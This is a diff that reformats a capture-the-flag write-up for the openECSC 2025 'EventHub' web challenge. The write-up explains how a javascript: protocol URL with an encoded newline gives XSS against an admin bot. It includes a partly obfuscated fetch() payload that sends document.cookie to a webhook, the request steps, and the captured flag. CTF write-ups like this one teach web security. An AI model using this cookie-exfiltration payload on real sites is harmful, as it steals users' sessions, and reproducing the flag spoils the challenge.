@@ -1,35 +1,29 @@
 ---
 title: "EventHub - openECSC 2025 Web Challenge Writeup"
 description: "openECSC 2025 EventHub writeup. Exploit JavaScript protocol handler and CRLF injection to execute XSS and exfiltrate admin cookies containing the flag."
+ctf: "openECSC 2025"
+date: 2025-10-05
+category: web
+difficulty: medium
+flag_format: "openECSC{...}"
+author: "zeba"
 ---
 
-# openECSC 2025
+# EventHub
 
-## Challenge: EventHub
+**openECSC 2025** · Web · Medium
 
-## Tags: web
-
-## Difficulty: Medium
-
-## Table of Contents
-
-- [Solution Overview](#solution-overview)
-- [Tools Used](#tools-used)
-- [Solution](#solution)
-- [Solution Script](#solution-script)
-- [Flag](#flag)
-
-### Solution Overview
+## Solution Overview
 
 EventHub lets users create events with arbitrary URLs (protocol + domain + path) that auto-redirect on the event page. The admin bot visits reported URLs on `http://127.0.0.1/` with a non-HttpOnly cookie containing the flag. By creating an event with `protocol=javascript` and injecting a percent-encoded newline (`%0a`) in the path, I break out of the `javascript://` comment and execute arbitrary JavaScript in the admin's browser context. This allows me to exfiltrate `document.cookie` to a webhook, capturing the flag. The exploit abuses browser URL decoding behavior where `%0a` becomes a real newline before the `javascript:` URL is interpreted.
 
-### Tools Used
+## Tools Used
 
 - Python 3 with `requests` library
 - [webhook.site](https://webhook.site) for flag exfiltration
 - Browser DevTools for debugging
 
-### Solution
+## Solution
 
 When I first opened the challenge, I saw a simple event management app. Users can:
 - Create events with a name, protocol, domain, and path
@@ -48,9 +42,9 @@ The event detail page caught my attention immediately—it has an auto-redirect 
 
 **First thought**: "If I control `event_url`, can I make this redirect somewhere malicious?"
 
-#### Finding the Pieces
+### Finding the Pieces
 
-##### Piece 1: The Admin Cookie
+#### Piece 1: The Admin Cookie
 
 Looking at `main.py`, the admin bot does something interesting:
 
@@ -60,7 +54,7 @@ driver.add_cookie({"name": "admin", "value": FLAG, "httpOnly": False})
 
 **Aha!** The flag is in a cookie that's **not HttpOnly**, meaning JavaScript can read it. If I can execute JS in the admin's context, I win.
 
-##### Piece 2: The Report Restriction
+#### Piece 2: The Report Restriction
 
 The `/report` endpoint only accepts URLs starting with `http://127.0.0.1/`:
 
@@ -71,7 +65,7 @@ if not url.startswith("http://127.0.0.1/"):
 
 So I need to make my payload work via a URL on the same origin as the admin's cookie.
 
-### Piece 3: The URL Construction
+#### Piece 3: The URL Construction
 
 When creating an event, the app stores `protocol`, `domain`, and `path` separately. The URL is reconstructed as:
 
@@ -81,7 +75,7 @@ f"{protocol}://{domain}{path}"
 
 **Key observation**: There's NO validation on what `protocol` can be! It just lowercases it. What if I use `javascript` as the protocol?
 
-#### The Exploit Chain
+### The Exploit Chain
 
 Here's my thought process:
 
@@ -102,7 +96,7 @@ Here's my thought process:
 
 When the browser decodes `%0a` → newline → the `fetch()` runs!
 
-#### Weaponizing the Exploit
+### Weaponizing the Exploit
 
 I needed to exfiltrate the cookie to my webhook. Here's the JavaScript payload:
 
@@ -118,9 +112,9 @@ fetch(String.fromCharCode(104,116,116,112,115,58,47,47,119,101,98,104,111,111,10
 
 *(Not strictly necessary, but felt cool 😎)*
 
-#### Putting It All Together
+### Putting It All Together
 
-##### Step 1: Create the Malicious Event
+#### Step 1: Create the Malicious Event
 
 I sent this POST request to `/event`:
 
@@ -136,7 +130,7 @@ This creates an event with URL:
 
 The app returned: `Location: /event/<id>`
 
-##### Step 2: Trigger the Admin Bot
+#### Step 2: Trigger the Admin Bot
 
 I reported this URL to the admin:
 
@@ -149,7 +143,7 @@ url=http://127.0.0.1/event/<id>?auto_redir=1
 
 When the admin visits, the page auto-redirects to our `javascript:` URL, the browser decodes `%0a`, the newline breaks the comment, and our `fetch()` executes—sending the cookie to my webhook!
 
-##### Step 3: Capture the Flag
+#### Step 3: Capture the Flag
 
 Checking my webhook, I received:
 
@@ -161,11 +155,11 @@ Decoding: `admin=openECSC{i_hate_browser_differentials_🤮_202c574bc2f5}`
 
 **Flag captured!**
 
-### Solution Script
+## Solution Script
 
 [exploit.py](exploit.py)
 
-### Flag
+## Flag
 
 **Flag**: `openECSC{i_hate_browser_differentials_🤮_202c574bc2f5}`
 
